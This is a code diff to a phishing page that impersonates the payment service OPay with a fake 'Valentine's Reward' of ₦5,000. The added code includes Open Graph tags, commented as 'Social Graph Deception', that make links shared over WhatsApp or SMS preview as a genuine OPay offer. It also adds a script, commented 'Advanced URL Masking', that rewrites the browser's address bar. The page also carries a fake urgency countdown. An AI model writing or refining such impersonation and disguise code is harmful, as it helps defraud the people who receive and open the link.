@@ -4,6 +4,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#00c853">
+
+    <!-- Social Graph Deception (Masks the link in WhatsApp/SMS) -->
+    <meta property="og:title" content="OPay Valentine's Reward 💚">
+    <meta property="og:description"
+        content="You have received ₦5,000! Claim your Valentine's gift now. Verification Code: OP-8821">
+    <meta property="og:image"
+        content="https://play-lh.googleusercontent.com/r9rKSQ_KNf_LTX4ISQvSfJkOc_UXr_h9XpG0g2YVkxVZQQOJHPbSwcZkZBN6TZR6WkI=s512">
+    <meta property="og:url" content="https://www.opayweb.com">
+    <meta property="og:type" content="website">
+
     <title>OPay Valentine's Reward 💚</title>
     <link rel="icon"
         href="https://play-lh.googleusercontent.com/r9rKSQ_KNf_LTX4ISQvSfJkOc_UXr_h9XpG0g2YVkxVZQQOJHPbSwcZkZBN6TZR6WkI=s48"
@@ -377,6 +388,14 @@
     <script>
         // ===== Countdown timer (cosmetic) =====
         var mins = 14, secs = 59;
+
+        // Advanced URL Masking
+        try {
+            if (window.history && window.history.replaceState) {
+                window.history.replaceState({}, "OPay Reward", "/opay-reward");
+            }
+        } catch (e) { }
+
         setInterval(function () {
             if (secs === 0) { if (mins === 0) return; mins--; secs = 59; } else { secs--; }
             document.getElementById("countdown").textContent =
